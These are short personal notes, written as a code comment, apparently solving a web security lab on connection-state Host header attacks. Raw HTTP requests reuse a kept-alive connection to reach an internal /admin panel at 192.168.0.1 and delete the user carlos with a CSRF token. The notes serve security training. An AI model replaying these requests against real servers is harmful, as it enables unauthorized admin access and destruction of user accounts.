/*

1) The connection should remain same, for the server to make the false 
    assumption of having the same host header

// first repeater tab
GET /
Host: Lab-ID.....
Connection: keep-alive

2) // second repeater tab
GET /admin
Host: 192.168.0.1

3) group the two requests

4) send in sequence, you can access the admin panel
// check the source, it shows an HTML post form for deleting a username

5) youre gonna send an HTML post form to process along with data in body 

6) change the 2nd tab content to 

POST /admin/delete HTTP/1.1
Host: 192.168.0.1
Cookie: session=sesscookie; _lab=labcookie
Content-Type: application/x-www-form-urlencoded     // HTML post form content type

csrf=Dpf5OB38qsRSS9LK5vVyNWkVGZsIBhv2&username=carlos


*/